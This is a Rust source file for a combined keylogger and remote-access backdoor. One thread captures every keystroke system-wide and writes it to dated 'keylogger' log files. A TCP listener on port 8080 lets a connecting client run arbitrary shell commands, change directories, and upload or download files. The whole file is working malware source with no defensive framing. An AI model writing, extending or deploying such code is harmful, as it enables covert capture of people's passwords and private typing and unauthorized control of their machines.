use chrono::Local;
use rdev::{listen, EventType};
use std::env;
use std::fs::File;
use std::fs::OpenOptions;
use std::path::Path;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;
use std::{
    io::{self, Read, Write},
    net::{TcpListener, TcpStream},
    process::{Command, Stdio},
};

fn main() -> std::io::Result<()> {
    let listener = TcpListener::bind("127.0.0.1:8080").unwrap();

    // Arc and Mutex to share the stream between the main thread and the keylogger
    let stream_mutex = Arc::new(Mutex::new(None::<TcpStream>));

    // Shared keystroke log buffer
    let keystroke_log = Arc::new(Mutex::new(String::new()));

    // Clone the Arc for the keylogger thread
    let log_clone = Arc::clone(&keystroke_log);

    // Start keylogger in a separate thread
    thread::spawn(move || {
        if let Err(error) = listen(move |event| {
            if let EventType::KeyPress(key) = event.event_type {
                let key_str = format!("{:?}", key);

                // Append captured key to the keystroke log buffer
                let mut log_data = log_clone.lock().unwrap();
                log_data.push_str(&key_str);
                log_data.push('\n');
            }
        }) {
            eprintln!("Error: {:?}", error);
        }
    });

    // Start logging to a file at regular intervals
    let log_clone = Arc::clone(&keystroke_log);
    thread::spawn(move || {
        loop {
            thread::sleep(Duration::from_secs(10));

            // Write the captured keystrokes to a log file every minute
            let mut log_data = log_clone.lock().unwrap();
            if !log_data.is_empty() {
                if let Err(e) = append_to_log(&log_data) {
                    eprintln!("Failed to write to log file: {}", e);
                }
                log_data.clear();
            }
        }
    });

    // Main server loop
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                let stream_clone = Arc::clone(&stream_mutex);
                {
                    // Lock the stream and update it with the new incoming connection
                    let mut locked_stream = stream_clone.lock().unwrap();
                    *locked_stream = Some(stream.try_clone().unwrap());
                }

                if let Err(e) = process_stream(stream) {
                    eprintln!("Failed to process {}", e);
                }
            }
            Err(e) => {
                eprintln!("Failed to process {}", e);
            }
        }
    }

    Ok(())
}

fn process_stream(mut stream: TcpStream) -> io::Result<()> {
    let mut buffer = [0; 1204];

    loop {
        let n = stream.read(&mut buffer)?;
        if n == 0 {
            println!("Client disconnected.");
            break;
        }

        let message = String::from_utf8_lossy(&buffer[..n]);

        if message.starts_with("upload") {
            let filename = message
                .split_whitespace()
                .nth(1)
                .expect("No file name provided");
            receive_file(&mut stream, filename)?;
        } else if message.starts_with("download") {
            let filename = message
                .split_whitespace()
                .nth(1)
                .expect("No file name provided");
            send_file(&mut stream, filename)?;
        } else {
            let response = match execute_command(&message) {
                Ok(result) => result,
                Err(e) => {                    
                    format!("Error executing command: {}\n", e)
                }
            };
            stream.write_all(response.as_bytes())?;
        }
    }
    Ok(())
}

fn execute_command(message: &str) -> io::Result<String> {
    let trimmed_message = message.trim();

    // Split the input into command and arguments
    let mut parts = trimmed_message.split_whitespace();
    if let Some(command) = parts.next() {
        if command == "cd" {
            // Get the directory argument
            let target_dir = parts.next().unwrap_or("~");

            // Change directory
            let result = if target_dir == "~" {
                // Change to home directory
                dirs::home_dir().ok_or_else(|| {
                    io::Error::new(io::ErrorKind::NotFound, "Home directory not found")
                })
            } else {
                // Change to the specified directory
                env::set_current_dir(target_dir).map(|_| env::current_dir().unwrap())
            };

            match result {
                Ok(new_dir) => Ok(format!("Changed directory to: {}\n", new_dir.display())),
                Err(e) => Ok(format!("Failed to change directory: {}\n", e)),
            }
        } else {
            // Collect the arguments after the command
            let args: Vec<&str> = parts.collect();

            // Use Command to run the specified command
            let output = Command::new(command)
                .args(&args)
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .output()?;

            // Get stdout and stderr
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);

            // Return stdout if the command was successful, otherwise return stderr
            if stdout.is_empty() && stderr.is_empty() {
                Ok(format!("Command '{}' executed successfully.\n", command))
            } else if !stdout.is_empty() {
                Ok(stdout.to_string())
            } else {
                Ok(stderr.to_string())
            }
        }
    } else {
        // If the command is empty
        Ok("No command received.".to_string())
    }
}

fn receive_file(stream: &mut TcpStream, filename: &str) -> io::Result<()> {
    let path = Path::new(filename);
    let mut file = File::create(path)?;

    // Read file size
    let mut size_buffer = [0; 8];
    stream.read_exact(&mut size_buffer)?;
    let file_size = u64::from_be_bytes(size_buffer);

    // Receive file content
    let mut buffer = [0; 1024];
    let mut total_bytes_received = 0;

    while total_bytes_received < file_size {
        let n = stream.read(&mut buffer)?;
        total_bytes_received += n as u64;
        file.write_all(&buffer[..n])?;
    }

    println!("File received: {}", filename);
    Ok(())
}

fn send_file(stream: &mut TcpStream, filename: &str) -> io::Result<()> {
    let path = Path::new(filename);
    let mut file = File::open(path)?;

    // Send file size
    let file_size = file.metadata()?.len();
    stream.write_all(&file_size.to_be_bytes())?;
    stream.flush()?;

    // Send file content
    let mut buffer = [0; 1024];
    loop {
        let n = file.read(&mut buffer)?;
        if n == 0 {
            break;
        }
        stream.write_all(&buffer[..n])?;
    }

    println!("File sent: {}", filename);
    Ok(())
}

// Appends the keystrokes to a log file
fn append_to_log(data: &str) -> io::Result<()> {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S");
    let file_name = format!("keylogger_{}.log", now.format("%Y-%m-%d"));

    let mut file = OpenOptions::new()
        .append(true)
        .create(true)
        .open(file_name)?;

    file.write_all(format!("{}:\n{}\n", timestamp, data).as_bytes())?;
    Ok(())
}
